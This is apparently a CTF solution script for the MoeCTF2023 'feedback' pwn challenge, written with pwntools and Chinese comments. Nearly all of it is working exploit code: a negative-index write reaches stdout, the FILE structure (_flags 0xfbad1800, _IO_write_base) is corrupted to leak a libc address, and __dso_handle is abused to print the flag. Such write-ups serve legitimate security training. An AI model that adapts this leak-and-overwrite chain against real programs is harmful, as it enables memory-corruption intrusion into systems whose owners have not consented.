"""MoeCTF2023 feedback
.bss:0000000000004020   stdout@@GLIBC_2_2_5 dq ?
...
.bss:0000000000004060   feedback_list dq ?
# (0x4060 - 0x4020) / 8 = 8, 第一步输入 -8 通过 feedback_list[-8] 定位到 stdout

https://n0va-scy.github.io/2019/09/21/IO_FILE/
控制IO泄露libc、控制stdout的IO_FILE结构，修改其_flags为0xfbad1800，
并将_IO_write_base的最后一个字节改小，从而实现多输出一些内容，这些内容里面就包含了libc地址。
之后当程序遇到puts函数时就会打印_IO_write_base到_IO_write_ptr之间的内容，泄露_IO_2_1_stdin_。
"""
from pwn import *

context.log_level = "debug"
context.arch = "amd64"
p = process('./feedback')

# p = gdb.debug('./feedback',
#               'b*$rebase(0x00015B3)\n'
#               'b*$rebase(0x00000000148D)\n'
#               # 'b*$rebase(0x0000149C)\n'
#               'c', env={"LD_PRELOAD": "./libc-2.31.so"})

p.sendlineafter("Which list do you want to write?", b"-8")  # stdout
payload = p64(0xFBAD1800) + p64(0) * 3 + b'\x00'
p.sendlineafter(".\n", payload)

p.recvuntil(b'\x00' * 8)
stdin_addr = u64(p.recv(8))  # stdin
success('stdin_addr: ' + hex(stdin_addr))

libc = ELF('./libc-2.31.so', checksec=False)
libc.address = stdin_addr - libc.sym['_IO_2_1_stdin_']

success(hex(libc.address))
# flag = libc.address + 0x1f1700 # 调试找到的地址
flag = libc.sym['puts'] + 0x16D2E0
"""
汇编中也有
.text:0000000000001364 mov     rax, cs:puts_ptr
.text:000000000000136B lea     rax, [rax+16D2E0h]
"""

p.sendlineafter("?", b"-11")
p.sendlineafter(".", b'\x68') #  tel "0x55a49db02060[feedlist地址] - 11*8"
# 0x55a49db02008 (__dso_handle) —▸ 0x55a49db02008 可以修改为 0x68即 feedback_list+8 的地址
# 0x55a49db02008 (__dso_handle) —▸ 0x55a49db02068 (feedback_list+8) —▸ 再写入 flag 地址输出
p.sendlineafter("?", b"-11")
p.sendlineafter(".", p64(flag))

p.interactive()
